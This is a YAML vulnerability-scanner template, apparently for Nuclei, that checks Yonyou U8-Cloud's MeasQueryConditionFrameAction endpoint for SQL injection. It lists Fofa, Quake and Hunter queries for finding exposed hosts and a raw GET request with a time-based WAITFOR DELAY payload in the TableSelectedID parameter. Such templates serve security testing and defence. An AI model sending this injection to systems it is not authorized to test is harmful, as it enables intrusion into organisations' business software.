id: Yonyou_u8c_cloud_MeasQueryConditionFrameAction_SQLi

info:
  name: Yonyou_u8c_cloud_MeasQueryConditionFrameAction_SQLi
  author: HK
  severity: high
  description: 用友U8-Cloud系统接口MeasQueryConditionFrameAction存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="http://uclient.yonyou.com/api/uclient/public/download/windows"
    Quake-query: body="http://uclient.yonyou.com/api/uclient/public/download/windows"
    Hunter-query: body="http://uclient.yonyou.com/api/uclient/public/download/windows"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:4%27--+ HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'